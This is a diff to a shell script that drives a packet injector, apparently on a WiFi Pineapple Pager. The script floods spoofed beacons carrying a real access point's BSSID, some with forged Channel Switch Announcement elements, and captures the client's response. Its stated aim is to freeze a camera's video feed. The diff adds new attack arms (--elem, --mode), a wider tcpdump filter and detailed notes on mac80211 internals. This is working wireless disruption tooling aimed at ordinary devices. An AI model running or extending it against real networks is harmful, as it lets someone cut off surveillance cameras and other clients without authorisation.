@@ -48,23 +48,45 @@
 #
 # Usage:
 #   ./run_17a.sh <inject-if> <bssid> <target-chan> <announce-chan> <count> [watch-if]
-#                [--stop-pineapd] [--clone] [--count-dec]
+#                [--stop-pineapd] [--clone] [--count-dec] [--elem=<eid>:<hex>] [--mode=<n>]
 #
-#   ./run_17a.sh wlan1mon FC:58:5A:08:42:15 8 1 0              # the count-0 control
-#   ./run_17a.sh wlan1mon FC:58:5A:08:42:15 8 1 3              # the arm that should differ
-#   ./run_17a.sh wlan1mon FC:58:5A:08:42:15 8 1 0 --clone      # ⭐ RUN THIS FIRST (see below)
-#   ./run_17a.sh wlan1mon FC:58:5A:08:42:15 8 1 3 --count-dec  # a conformant countdown
+#   ./run_17a.sh wlan1mon FC:58:5A:08:42:15 8 1 0 wlan1mon --elem=32:00   # ⭐ RUN THIS FIRST
+#   ./run_17a.sh wlan1mon FC:58:5A:08:42:15 8 8 3 wlan1mon --mode=1       # quiet, no move
+#   ./run_17a.sh wlan1mon FC:58:5A:08:42:15 8 1 3 wlan1mon --mode=0       # move, no quiet
+#   ./run_17a.sh wlan1mon FC:58:5A:08:42:15 8 1 3 wlan1mon --count-dec
+#   ./run_17a.sh wlan1mon FC:58:5A:08:42:15 8 1 0 wlan1mon --clone        # near-null, see below
 #
-# ⭐ --clone IS THE ARM TO RUN FIRST, and it is new on 2026-11-10. It floods the captured beacon
-# VERBATIM -- no CSA element at all -- which is the only thing that separates "the client honoured
-# the announced switch" from "the client was upset by ~95 spoofed beacons carrying its AP's BSSID".
-# The first 17a run froze a camera's feed identically for count 0 and count 3, and nothing in it
-# distinguished those two explanations. If the feed freezes under --clone too, the element is
-# irrelevant and the count result is about nothing. <announce-chan> and <count> are ignored here.
+# ⭐ PASS THE INJECT INTERFACE AS <watch-if>. It is the one EXAMINE parks, and client ToDS frames
+# are measured to appear on it (CLAUDE.md "Second contact"). The old advice -- wlan0mon -- is
+# measured BLIND, because pineapd hops it. Without a capture an arm produces an operator impression
+# and nothing else, and the capture is what separates "the client had to auth/assoc its way back"
+# from "it was quiesced and never left": two mechanisms, one frozen feed.
 #
-# --count-dec decrements the count on every frame, 3,2,1,0 and repeat, as a real AP does. Every run
-# before 2026-11-10 sent a CONSTANT count, which no AP ever sends, and that is the strongest
-# surviving reason the count-3 arm behaved like count 0.
+# ⚠ WHAT THE 2026-11-10 ADVERSARIAL PASS FOUND, because it changes which arm is worth running.
+#
+# --clone is a NEAR-TAUTOLOGICAL control on a mac80211 client, not the clean control it looks like.
+# A verbatim clone has the same beacon_int, capability and filtered element set as the AP's own
+# beacons, so it hashes to the same beacon_crc and is dropped by `goto free` at mlme.c:6929 --
+# AHEAD of both ieee80211_rx_bss_info() (:6934) and ieee80211_sta_process_chanswitch() (:6936). It
+# therefore separates "extra beacon frames" from "a CRC-relevant change", which is worth having,
+# but NOT "the CSA element" from "any change to the beacon at all".
+#
+# --elem=<eid>:<hex> is the control that does. It appends one arbitrary element, so pick an id
+# INSIDE mac80211's filter (7, 32, 42, 45, 60, 61 -- 32:00 is cleanest) and the frame is parsed
+# without announcing any switch. A freeze under --elem=32:00 means the reaction is to the beacon
+# changing, and every count result so far is about beacon churn. pagerinj warns if you pick an id
+# outside the filter, because that arm would be another guaranteed null.
+#
+# --mode= separates the two things a CSA does, which no arm has yet separated. Channel Switch
+# Mode 1 blocks the client's TX queues on the FIRST accepted beacon (mlme.c:2610), count-independently
+# -- and a stalled uplink alone freezes a video stream. So:
+#     --mode=1 with announce-chan == target-chan   quiet, nothing to move to
+#     --mode=0 with announce-chan != target-chan   move announced, no transmit restriction
+# If the quiet arm freezes and the move arm does not, the count byte was never in the causal path.
+#
+# --count-dec decrements 3,2,1 and repeats. It used to wrap through 0 and so transmitted count 0 on
+# 23 of 92 frames -- including the last frame on the air -- which made that arm strictly contain the
+# separate count-0 condition. Fixed 2026-11-10; it now floors at 1 and reports frames by count.
 #
 # Run the control FIRST, reconnect the client, then the count-3 arm. One arm per invocation on
 # purpose: the thing being measured is a client's behaviour, and that needs you watching it.
@@ -80,18 +102,26 @@ die() { printf '%s\n' "$*" >&2; exit 1; }
 
 [ $# -ge 5 ] || die "usage: $0 <inject-if> <bssid> <target-chan> <announce-chan> <count> [watch-if] [--stop-pineapd]"
 IF="$1"; BSSID="$2"; TCHAN="$3"; ACHAN="$4"; COUNT="$5"
-WIF=""; STOP_PINEAPD=0; CLONE=0; COUNT_DEC=0
+WIF=""; STOP_PINEAPD=0; CLONE=0; COUNT_DEC=0; ELEM=""; MODE=""
 shift 5
+# --elem and --mode take a value, and this loop has no lookahead, so they are spelled
+# --elem=<eid>:<hex> and --mode=<n>. One less thing to get wrong than a positional pair.
 for a in "$@"; do
   case "$a" in
+    --elem=*)       ELEM="${a#--elem=}" ;;
+    --mode=*)       MODE="${a#--mode=}" ;;
     --stop-pineapd) STOP_PINEAPD=1 ;;
     --clone)        CLONE=1 ;;
     --count-dec)    COUNT_DEC=1 ;;
+    --elem|--mode)  die "$a takes a value: spell it $a=<value>" ;;
     -*) die "unknown option: $a" ;;
     *) WIF="$a" ;;
   esac
 done
 [ "$CLONE" = 1 ] && [ "$COUNT_DEC" = 1 ] && die "--clone and --count-dec are different arms: --clone sends no CSA element, so there is no count to decrement"
+[ -n "$ELEM" ] && [ "$CLONE" = 1 ] && die "--clone and --elem= are different controls: --clone appends nothing, --elem appends one element"
+[ -n "$ELEM" ] && [ "$COUNT_DEC" = 1 ] && die "--elem= sends no CSA element, so there is no count to decrement"
+[ -n "$ELEM" ] && printf -- '!! --elem=%s: <announce-chan> %s and <count> %s are IGNORED -- this arm announces no switch\n' "$ELEM" "$ACHAN" "$COUNT" >&2
 [ "$CLONE" = 1 ] && printf -- '!! --clone: <announce-chan> %s and <count> %s are IGNORED -- this arm sends no CSA element at all\n' "$ACHAN" "$COUNT" >&2
 
 [ -x "$PAGERINJ" ] || die "no injector at $PAGERINJ (set PAGERINJ=/path to override)"
@@ -102,7 +132,20 @@ esac
 [ "$TCHAN" -gt 0 ] 2>/dev/null || die "target-chan must be a positive number"
 [ "$ACHAN" -gt 0 ] 2>/dev/null || die "announce-chan must be a positive number"
 [ "$COUNT" -ge 0 ] 2>/dev/null || die "count must be 0 or more"
-[ "$TCHAN" != "$ACHAN" ] || die "announce-chan must differ from target-chan: a same-channel CSA announces no move, and pagerinj refuses it"
+# Only the CSA arms announce a channel, and only mode 1 has a reason to name the SAME channel: it
+# is the quiet-without-a-move arm, which is how you separate "the client obeyed the transmit
+# restriction" from "the client actually switched". pagerinj still wants --allow-same-chan for it.
+if [ "$CLONE" != 1 ] && [ -z "$ELEM" ] && [ "$TCHAN" = "$ACHAN" ]; then
+  [ "$MODE" = 1 ] || die "announce-chan must differ from target-chan: a same-channel CSA announces no move. The one exception is the quiet-only arm, which needs --mode=1."
+  printf -- '!! same-channel CSA with --mode=1: this is the QUIET-ONLY arm. It announces no move,\n' >&2
+  printf -- '!! so anything the client does is the mode-1 transmit restriction and not a switch.\n' >&2
+  SAME_CHAN_OK=1
+fi
+# EMPTY, not 0. ${VAR:+word} expands whenever VAR is non-empty, and the string "0" is non-empty --
+# so defaulting this to 0 would have passed --allow-same-chan on EVERY CSA arm and silently
+# defeated pagerinj's same-channel refusal, which exists because a same-channel mode-0 CSA is
+# discarded outright by csa_present() (mlme.c:8379).
+: "${SAME_CHAN_OK:=}"
 
 # 2.4 GHz channel -> centre MHz. Only 1-14, the band where the Pager can both inject and watch.
 mhz_for() {
@@ -320,6 +363,13 @@ else
   printf -- '!! NOT PARKED: no EXAMINE was issued, so the radio is wherever it happens to be.\n' >&2
 fi
 
+if [ -z "$WIF" ]; then
+  printf -- '!! no <watch-if> given, so NO capture will run and this arm produces an operator\n' >&2
+  printf -- '!! impression and nothing else. The capture is what separates "the client had to\n' >&2
+  printf -- '!! auth/assoc its way back" from "it was quiesced by mode 1 and never left" -- the\n' >&2
+  printf -- '!! two mechanisms that both look like a frozen feed. Pass %s as the watch-if: it is\n' "$IF" >&2
+  printf -- '!! the interface EXAMINE parks, and client ToDS frames are measured to appear on it.\n' >&2
+fi
 if [ -n "$WIF" ]; then
   mkdir -p /root/loot 2>/dev/null
   iface_ready "$WIF" || { printf -- '-- %s is not up; bringing it up\n' "$WIF" >&2; bring_up "$WIF" || true; }
@@ -328,17 +378,23 @@ if [ -n "$WIF" ]; then
   elif [ "$COUNT_DEC" = 1 ]; then ARM="c${COUNT}dec"
   else ARM="c${COUNT}"; fi
   OUT="/root/loot/csa_17a_${ARM}_$(date +%s 2>/dev/null || echo now).pcap"
-  # ONE primitive, on purpose. An earlier revision used
-  #   (type mgt and subtype beacon or subtype action) and wlan addr2 <bssid>
+  # ⚠ THE FILTER USED TO BE `wlan addr2 <bssid>` ALONE, WHICH COULD NOT SEE THE CLIENT -- and the
+  # client is the entire subject of 17a. addr2 is the transmitter, so that form shows our clones,
+  # the AP's own beacons and 17c's action frames, and nothing the station ever sends. Adding
+  # `wlan addr1 <bssid>` picks up the client's ToDS data AND its auth/assoc requests (addr1 is the
+  # AP for both), plus the AP's responses. That pair is what distinguishes "the client was
+  # disconnected and had to auth/assoc its way back" from "the client was merely quiesced by
+  # Channel Switch Mode 1 and never left" -- the two mechanisms that produce an identical frozen
+  # feed. Found by the 2026-11-10 adversarial pass.
+  #
+  # An earlier revision used `(type mgt and subtype beacon or subtype action) and wlan addr2 ...`
   # and `subtype action` is NOT in pcap-filter's mgt subtype list, so the filter never compiled.
-  # `wlan addr2 <bssid>` catches our cloned beacons, the AP's own beacons (useful: compare the two
-  # and read the real DS channel) and 17c's action frames, since all carry the BSSID as addr2.
   # -U so records reach the file as they arrive: WITHOUT it tcpdump buffers, and the previous
   # revision's "is the file >= 24 bytes yet" arm test called a perfectly healthy capture dead while
   # tcpdump was printing its own "listening on ..." banner. The sound test is whether the PROCESS
   # is alive -- which is what CamHound's capture_bss does, and what this now copies.
   : >"$CAPERR"
-  tcpdump -i "$WIF" -nn -e -s 0 -U -w "$OUT" "wlan addr2 $BSSID" >/dev/null 2>"$CAPERR" &
+  tcpdump -i "$WIF" -nn -e -s 0 -U -w "$OUT" "wlan addr1 $BSSID or wlan addr2 $BSSID" >/dev/null 2>"$CAPERR" &
   CAP=$!
   sleep 2
   if kill -0 "$CAP" 2>/dev/null; then
@@ -346,7 +402,7 @@ if [ -n "$WIF" ]; then
   else
     printf -- '!! capture died on %s. tcpdump said:\n' "$WIF" >&2
     sed -n '1,6p' "$CAPERR" >&2 2>/dev/null
-    printf -- '!! re-check the filter with:  tcpdump -d wlan addr2 %s\n' "$BSSID" >&2
+    printf -- '!! re-check the filter with:  tcpdump -d wlan addr1 %s or wlan addr2 %s\n' "$BSSID" "$BSSID" >&2
     CAP=""; OUT=""
   fi
 fi
@@ -357,10 +413,14 @@ printf -- '-- firing\n' >&2
 # goes on the air.
 if [ "$CLONE" = 1 ]; then
   "$PAGERINJ" -i "$IF" --clone --bssid "$BSSID" --secs 10
+elif [ -n "$ELEM" ]; then
+  "$PAGERINJ" -i "$IF" --elem "$ELEM" --bssid "$BSSID" --secs 10
 elif [ "$COUNT_DEC" = 1 ]; then
-  "$PAGERINJ" -i "$IF" --csa --bssid "$BSSID" --chan "$ACHAN" --count "$COUNT" --count-dec --secs 10
+  "$PAGERINJ" -i "$IF" --csa --bssid "$BSSID" --chan "$ACHAN" --count "$COUNT" --count-dec --secs 10 \
+    ${MODE:+--mode "$MODE"} ${SAME_CHAN_OK:+--allow-same-chan}
 else
-  "$PAGERINJ" -i "$IF" --csa --bssid "$BSSID" --chan "$ACHAN" --count "$COUNT" --secs 10
+  "$PAGERINJ" -i "$IF" --csa --bssid "$BSSID" --chan "$ACHAN" --count "$COUNT" --secs 10 \
+    ${MODE:+--mode "$MODE"} ${SAME_CHAN_OK:+--allow-same-chan}
 fi
 RC=$?
 
